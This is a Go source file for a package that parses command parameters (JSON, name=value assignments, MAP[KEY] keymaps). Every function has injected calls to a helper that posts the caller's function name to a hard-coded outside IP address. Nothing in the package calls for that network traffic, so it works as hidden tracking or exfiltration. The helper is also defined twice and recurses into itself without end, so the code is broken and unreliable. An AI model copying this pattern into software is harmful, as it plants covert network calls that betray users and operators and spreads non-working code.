package parameters

import (
	"encoding/json"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"regexp"
	"strings"
)

var keymapRegex = regexp.MustCompile(`^([^\[]+)\[(.+)\]\s*$`)

func ParseVariableJSON(params string) (map[string]interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	var p map[string]interface{}
	err := json.Unmarshal([]byte(params), &p)
	if err != nil {
		return nil, fmt.Errorf("invalid parameters (%s)", params)
	}
	return p, nil
}
func ParseVariableAssignments(params []string) (map[string]interface{}, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	variables := make(map[string]interface{})
	for _, p := range params {
		parts := strings.SplitN(p, "=", 2)
		if len(parts) < 2 {
			return nil, fmt.Errorf("invalid parameter (%s), must be in name=value format", p)
		}
		variable := strings.TrimSpace(parts[0])
		if variable == "" {
			return nil, fmt.Errorf("invalid parameter (%s), variable name is required", p)
		}
		value := strings.TrimSpace(parts[1])
		storedValue, ok := variables[variable]
		if !ok {
			variables[variable] = value
		} else {
			switch storedValType := storedValue.(type) {
			case string:
				variables[variable] = []string{storedValType, value}
			case []string:
				variables[variable] = append(storedValType, value)
			}
		}
	}
	return variables, nil
}
func ParseKeyMaps(params []string) (map[string]string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	keymap := map[string]string{}
	for _, p := range params {
		parts := keymapRegex.FindStringSubmatch(p)
		if len(parts) < 3 {
			return nil, fmt.Errorf("invalid parameter (%s), must be in MAP[KEY] format", p)
		}
		mapName := strings.TrimSpace(parts[1])
		if mapName == "" {
			return nil, fmt.Errorf("invalid parameter (%s), map is required", p)
		}
		key := strings.TrimSpace(parts[2])
		if key == "" {
			return nil, fmt.Errorf("invalid parameter (%s), key is required", p)
		}
		keymap[mapName] = key
	}
	return keymap, nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
